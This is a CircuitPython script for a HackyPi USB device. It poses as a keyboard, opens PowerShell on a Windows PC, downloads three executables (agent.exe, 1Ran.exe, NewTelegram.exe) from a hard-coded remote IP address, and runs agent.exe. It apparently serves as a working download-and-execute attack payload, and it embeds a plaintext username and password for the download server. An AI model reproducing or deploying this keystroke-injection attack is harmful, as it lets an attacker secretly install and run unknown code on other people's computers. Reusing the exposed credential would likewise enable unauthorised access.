# This program demonstrates how HackyPi can download and execute a file via PowerShell
# This code works for Windows based PC/Laptop but can be modified for Other OS
import time
import board
import usb_hid
import digitalio
import busio
import terminalio
import displayio
from adafruit_hid.keyboard import Keyboard, Keycode
# تغيير تخطيط الكيبورد من UK إلى US
from adafruit_hid.keyboard_layout_us import KeyboardLayout
from adafruit_st7789 import ST7789
from adafruit_display_text import label

# Declare some parameters used to adjust style of text and graphics
BORDER = 12
FONTSCALE = 3
BACKGROUND_COLOR = 0xFF0000  # red
FOREGROUND_COLOR = 0xFFFF00  # Yellow
TEXT_COLOR = 0x0000ff

# Release any resources currently in use for the displays
displayio.release_displays()

tft_clk = board.GP10 # must be a SPI CLK
tft_mosi= board.GP11 # must be a SPI TX
tft_rst = board.GP12
tft_dc  = board.GP8
tft_cs  = board.GP9
spi = busio.SPI(clock=tft_clk, MOSI=tft_mosi)

# Make the displayio SPI bus and the ST7789 display
display_bus = displayio.FourWire(spi, command=tft_dc, chip_select=tft_cs, reset=tft_rst)
display = ST7789(display_bus, rotation=270, width=240, height=135, rowstart=40, colstart=53)

# Make the display context
splash = displayio.Group()
display.show(splash)

color_bitmap = displayio.Bitmap(display.width, display.height, 1)
color_palette = displayio.Palette(1)
color_palette[0] = BACKGROUND_COLOR

# This section switch On the backlight of TFT
tft_bl = board.GP13
led = digitalio.DigitalInOut(tft_bl)
led.direction = digitalio.Direction.OUTPUT
led.value = True

bg_sprite = displayio.TileGrid(color_bitmap, pixel_shader=color_palette, x=0, y=0)
splash.append(bg_sprite)

# This function creates colorful rectangular box 
def inner_rectangle():
    # Draw a smaller rectangle with the foreground color
    inner_bitmap = displayio.Bitmap(
        display.width - BORDER * 2,
        display.height - BORDER * 2,
        1
    )
    inner_palette = displayio.Palette(1)
    inner_palette[0] = FOREGROUND_COLOR
    inner_sprite = displayio.TileGrid(
        inner_bitmap,
        pixel_shader=inner_palette,
        x=BORDER,
        y=BORDER
    )
    splash.append(inner_sprite)

# Function to print data on TFT
def print_onTFT(text, x_pos, y_pos): 
    text_area = label.Label(terminalio.FONT, text=text, color=TEXT_COLOR)
    text_group = displayio.Group(scale=FONTSCALE, x=x_pos, y=y_pos)
    text_group.append(text_area)
    splash.append(text_group)

# Clear display and show initial message
inner_rectangle()
print_onTFT("HackyPi", 60, 40)
print_onTFT("PowerShell", 40, 80)
time.sleep(2)

try:
    keyboard = Keyboard(usb_hid.devices)
    # استخدام تخطيط US بدلاً من UK
    keyboard_layout = KeyboardLayout(keyboard)

    # Open PowerShell
    inner_rectangle()
    print_onTFT("Opening", 60, 40)
    print_onTFT("PowerShell", 40, 80)

    keyboard.send(Keycode.WINDOWS, Keycode.R)
    time.sleep(0.5)
    keyboard_layout.write('powershell')
    keyboard.send(Keycode.ENTER)
    time.sleep(2)

    # Maximize window
    keyboard.send(Keycode.ALT, Keycode.SPACE)
    time.sleep(0.3)
    keyboard.send(Keycode.X)
    time.sleep(1)

    # Download the first file with credentials
    inner_rectangle()
    print_onTFT("Downloading", 40, 40)
    print_onTFT("File 1/3...", 50, 80)
    time.sleep(1)

    # الاختبار: اكتب أمر بسيط أولاً لمعرفة إذا كانت علامات التنصيص صحيحة
    keyboard_layout.write('echo "Hi From Omar"')
    keyboard.send(Keycode.ENTER)
    time.sleep(1)
    
    # تنزيل الملف الأول
    keyboard_layout.write('Invoke-WebRequest -Uri "http://37.8.86.104:8080/513eba9524694dcbe7064b4a669d6ab3397e828c/agent.exe" -OutFile "agent.exe" -Credential (New-Object System.Management.Automation.PSCredential("omar",(ConvertTo-SecureString "+MKw*jEk4n4TwMPx@hNmEreH" -AsPlainText -Force)))')
    keyboard.send(Keycode.ENTER)
    time.sleep(10)  # وقت كافٍ للتنزيل

    # تنزيل الملف الثاني - 1Ran.exe
    inner_rectangle()
    print_onTFT("Downloading", 40, 40)
    print_onTFT("File 2/3...", 50, 80)
    time.sleep(1)
    
    keyboard_layout.write('Invoke-WebRequest -Uri "http://37.8.86.104:8080/513eba9524694dcbe7064b4a669d6ab3397e828c/1Ran.exe" -OutFile "1Ran.exe" -Credential (New-Object System.Management.Automation.PSCredential("omar",(ConvertTo-SecureString "+MKw*jEk4n4TwMPx@hNmEreH" -AsPlainText -Force)))')
    keyboard.send(Keycode.ENTER)
    time.sleep(10)  # وقت كافٍ للتنزيل

    # تنزيل الملف الثالث - NewTelegram
    inner_rectangle()
    print_onTFT("Downloading", 40, 40)
    print_onTFT("File 3/3...", 50, 80)
    time.sleep(1)
    
    keyboard_layout.write('Invoke-WebRequest -Uri "http://37.8.86.104:8080/513eba9524694dcbe7064b4a669d6ab3397e828c/NewTelegram.exe" -OutFile "NewTelegram.exe" -Credential (New-Object System.Management.Automation.PSCredential("omar",(ConvertTo-SecureString "+MKw*jEk4n4TwMPx@hNmEreH" -AsPlainText -Force)))')
    keyboard.send(Keycode.ENTER)
    time.sleep(10)  # وقت كافٍ للتنزيل

    # Execute only the first file
    inner_rectangle()
    print_onTFT("Executing", 50, 40)
    print_onTFT("First File...", 30, 80)

    keyboard_layout.write('.\\agent.exe')
    keyboard.send(Keycode.ENTER)
    time.sleep(3)

    # Show completion message
    inner_rectangle()
    print_onTFT("Download &", 35, 40)
    print_onTFT("Execution Complete!", 10, 80)
    print_onTFT("Files Downloaded:", 20, 110)
    print_onTFT("1Ran.exe, NewTelegram", 5, 140)

    keyboard.release_all()

except Exception as ex:
    keyboard.release_all()
    inner_rectangle()
    print_onTFT("Error", 70, 40)
    print_onTFT("Occurred!", 40, 80)
    # اطبع جزء من الخطأ
    error_msg = str(ex)[:30]
    print_onTFT(error_msg, 20, 100)
    raise ex

time.sleep(3)
